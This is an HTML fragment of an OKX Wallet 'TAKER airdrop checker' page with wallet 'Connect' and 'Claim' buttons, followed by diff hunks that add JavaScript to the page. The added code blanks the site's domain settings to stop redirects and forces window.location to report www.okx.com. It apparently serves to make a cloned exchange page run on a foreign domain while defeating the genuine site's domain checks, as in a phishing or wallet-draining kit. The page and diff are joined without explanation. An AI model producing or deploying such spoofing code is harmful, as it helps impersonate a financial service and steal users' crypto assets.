id="headerState">{"headerContext":{"logoImgUrl":"https://web3.okx.com/cdn/assets/imgs/254/C86C33BB49D17F5E.png","templateConfig":null,"headerType":"2","isSSRSuccess":true}}</script></header><div class="home-container"><div id="root" role="main"><div class="App_tge-container__R3d0s"><div class="index_main__vTdca"><div class="index_container__lgUpw"><picture class="okui-picture index_picture__LXQ+M okui-picture-font"><source srcSet="https://web3.okx.com/cdn/web3/oklinkadmin/picture/31c33f86-db5f-4d88-9c3d-93a8cbbf64d3.png?x-oss-process=image/format,webp/ignore-error,1"/><img class="index_image__73p2m" src="assets/oklinkadmin/picture/31c33f86-db5f-4d88-9c3d-93a8cbbf64d3.png" alt=""/></picture><div class="index_content__WJM2Y index_content__4sILb"><div class="index_descriptionWrapper__YYmko"><div class="index_title__jcAwO"><picture class="okui-picture index_logo__u78+x okui-picture-font"><source srcSet="https://web3.okx.com/cdn/web3/oklinkadmin/picture/653fee27-e321-4508-bc71-83d5a49429b0.png?x-oss-process=image/format,webp/ignore-error,1"/><img class="" src="assets/oklinkadmin/picture/653fee27-e321-4508-bc71-83d5a49429b0.png" alt="TAKER airdrop checker"/></picture><h1 class="index_name__QjBfW">TAKER airdrop checker</h1></div><div class="index_desc__PhI2Z">Bitcoin incentive layer: Scaling Bitcoin hodlers 100x. Check your TAKER airdrop eligibility on OKX Wallet. Claim starts on July 18, 2025.</div><div class="index_medias__fI1XJ"><button type="button" class="okui-plain-button"><i class="icon iconfont okx-wallet-x index_mediaIcon__2d7TL" role="img" aria-hidden="true"></i></button><button type="button" class="okui-plain-button"><i class="icon iconfont okx-wallet-discord index_mediaIcon__2d7TL" role="img" aria-hidden="true"></i></button><button type="button" class="okui-plain-button"><i class="icon iconfont okx-wallet-tg index_mediaIcon__2d7TL" role="img" aria-hidden="true"></i></button><button type="button" class="okui-plain-button"><i class="icon iconfont okx-wallet-official-website index_mediaIcon__2d7TL" role="img" aria-hidden="true"></i></button></div><div class="index_snapshot__aKTHS"><div class="index_iconLabel__PTXdy"><i class="icon iconfont okx-wallet-camera index_icon__NiHbk" role="img" aria-hidden="true"></i><span class="index_label__-UnSJ">Snapshot time</span></div><div class="index_time__dNQt1">July 11, 11:59 PM (UTC+8)</div></div></div><div class="index_container__z5Oss"><div class="index_receiveWrapper__EU2Oo index_withoutCoinInfo__HJr74"><div class="index_field__QHWfn"><div class="index_label__aiY+C">You can receive</div><div class="index_valueBox__9XH+J"><div class="index_amountInputBox__JcJeA"><div class="index_amountContent__n3mWw"><span class="index_amountInputInvalid__xHNx1">-- TAKER</span></div></div></div></div><div class="index_field__QHWfn"><div class="index_label__aiY+C">Your receiving address</div><div class="index_valueBox__9XH+J"><div class="okui-input-var okui-input okui-input-xl disabled"><div class="okui-input-box" role="none"><input type="text" disabled="" placeholder="Your receiving address" id="_R_55p_" class="okui-input-input" autoCapitalize="off" autoCorrect="off" value=""/><div class="okui-input-suffix"><button type="button" class="okui-button-var okui-btn btn-xs btn-outline-primary"><span class="btn-content">Connect</span></button></div></div></div></div></div></div></div></div></div></div><div class="index_footer__dWTKm"><div class="index_footerContent__egXFY"><div class="index_receive__7C-BO"><div class="index_label__57D8G">You can receive</div><div class="index_value__w-akI">-- TAKER</div></div><div class="index_actions__46rtw"><div class="index_action__VG5m-"><button type="button" class="okui-button-var okui-btn btn-xl btn-fill-highlight block"><span class="btn-content okui-btn-ellipsis">Claim</span></button></div></div></div></div></div>
@@ -212,6 +409,7 @@
               }
             }
           }
+          // Override all config that could trigger redirects
           if($okGlobal) {
             try {
               window._okGlobal = JSON.parse($okGlobal.textContent);
@@ -238,6 +436,17 @@
                   return true;
                 });
               }
+              // Continuously override these values if they're modified
+              Object.defineProperty(window._okGlobal, 'innerDomain', {
+                get: function() { return ''; },
+                set: function() {},
+                configurable: true
+              });
+              Object.defineProperty(window._okGlobal, 'mainDomain', {
+                get: function() { return ''; },
+                set: function() {},
+                configurable: true
+              });
             } catch(err) {
               window._okGlobal = {
                 msg: err ? err.message : 'parse okGlobal error'
@@ -262,12 +471,75 @@
               if (window._okxGlobal.hasOwnProperty('isInnerDomain')) {
                 window._okxGlobal.isInnerDomain = false;
               }
+              // Continuously override these values if they're modified
+              Object.defineProperty(window._okxGlobal, 'innerDomain', {
+                get: function() { return ''; },
+                set: function() {},
+                configurable: true
+              });
+              Object.defineProperty(window._okxGlobal, 'mainDomain', {
+                get: function() { return ''; },
+                set: function() {},
+                configurable: true
+              });
             } catch(err) {
               window._okxGlobal = {
                 msg: err ? err.message : 'parse okGlobal error'
               }
             }
           }
+          
+          // After DOMContentLoaded, re-apply hostname override to www.okx.com
+          window.addEventListener('DOMContentLoaded', function() {
+            try {
+              Object.defineProperty(window.location, 'hostname', {
+                get: function() { return 'www.okx.com'; },
+                set: function() {},
+                configurable: true,
+                enumerable: true
+              });
+              Object.defineProperty(window.location, 'host', {
+                get: function() { return 'www.okx.com'; },
+                set: function() {},
+                configurable: true,
+                enumerable: true
+              });
+              Object.defineProperty(window.location, 'origin', {
+                get: function() { return 'https://www.okx.com'; },
+                set: function() {},
+                configurable: true,
+                enumerable: true
+              });
+            } catch(e) {
+              console.warn('Could not re-apply hostname override:', e);
+            }
+          });
+          
+          // After load, re-apply hostname override again to www.okx.com
+          window.addEventListener('load', function() {
+            try {
+              Object.defineProperty(window.location, 'hostname', {
+                get: function() { return 'www.okx.com'; },
+                set: function() {},
+                configurable: true,
+                enumerable: true
+              });
+              Object.defineProperty(window.location, 'host', {
+                get: function() { return 'www.okx.com'; },
+                set: function() {},
+                configurable: true,
+                enumerable: true
+              });
+              Object.defineProperty(window.location, 'origin', {
+                get: function() { return 'https://www.okx.com'; },
+                set: function() {},
+                configurable: true,
+                enumerable: true
+              });
+            } catch(e) {
+              console.warn('Could not re-apply hostname override on load:', e);
+            }
+          });
           if($devState) {
             try {
               window.devState = JSON.parse($devState.textContent);
